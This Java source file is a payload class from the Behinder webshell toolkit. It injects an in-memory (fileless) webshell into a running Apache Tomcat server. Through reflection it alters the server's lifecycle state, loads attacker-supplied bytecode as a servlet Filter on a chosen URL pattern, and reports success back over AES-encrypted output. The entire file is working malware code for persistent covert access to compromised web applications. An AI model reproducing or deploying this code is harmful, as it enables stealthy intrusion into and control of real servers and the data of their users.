package net.rebeyond.behinder.payload.java.memoryshell;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

public class Tomcat extends ClassLoader {
    public static String urlPattern;
    public static String shellString;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;


    public boolean equals(Object object) {
        PageContext page = (PageContext)object;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        this.Response.setCharacterEncoding("UTF-8");
        Map<String, String> result = new HashMap<>();

        try {
            final ServletContext servletContext = this.Session.getServletContext();

            Field field = servletContext.getClass().getDeclaredField("context");
            field.setAccessible(true);
            Object applicationContext = field.get(servletContext);

            field = applicationContext.getClass().getDeclaredField("context");
            field.setAccessible(true);
            Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
            Object standardContext = field.get(applicationContext);

            Object[] LifecycleStates = (Object[]) Class.forName("org.apache.catalina.LifecycleState").getMethod("values").invoke(null);

            String filterName = "filter"+System.currentTimeMillis();
            Filter filterShell = (Filter) new Tomcat(this.getClass().getClassLoader()).g(shellString.getBytes(StandardCharsets.ISO_8859_1)).newInstance();

            Field stateField = Class.forName("org.apache.catalina.util.LifecycleBase").getDeclaredField("state");
            stateField.setAccessible(true);
//            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
            stateField.set(standardContext, LifecycleStates[3]);
//            javax.servlet.FilterRegistration.Dynamic filterRegistration = standardContext.getServletContext().addFilter(filterName, filterShell);
            javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter(filterName, filterShell);
            filterRegistration.setInitParameter("encoding", "utf-8");
            filterRegistration.setAsyncSupported(false);
            filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, urlPattern);

            stateField.set(standardContext, LifecycleStates[5]);

            Method filterStartMethod = standardContext.getClass().getMethod("filterStart");
            filterStartMethod.invoke(standardContext, null);

            result.put("msg", "成功");
            result.put("status", "success");
        } catch (Exception e) {
            result.put("msg", e.getMessage());
            result.put("status", "fail");
        }

        try {

            ServletOutputStream so = this.Response.getOutputStream();
            so.write(Encrypt(buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
            page.getOut().clear();
        } catch (Exception e) {
            e.printStackTrace();
        }

        return true;
    }

    public Tomcat() {}
    public Tomcat(ClassLoader c){
        super(c);
    }
    public Class g(byte[] b){
        return super.defineClass(b, 0, b.length);
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        String key = this.Session.getAttribute("u").toString();
        byte[] raw = key.getBytes("utf-8");
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {

            sb.append("\"" + key + "\":\"");
            String value = ((String)entity.get(key)).toString();
            if (encode)
            {
                if (version.compareTo("1.9") >= 0) {

                    getClass(); Class<?> Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { value.getBytes("UTF-8") });
                }
                else {

                    getClass(); Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Object Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { value.getBytes("UTF-8") });
                    value = value.replace("\n", "").replace("\r", "");
                }
            }

            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(","))
            sb.setLength(sb.length() - 1);
        sb.append("}");
        return sb.toString();
    }
}
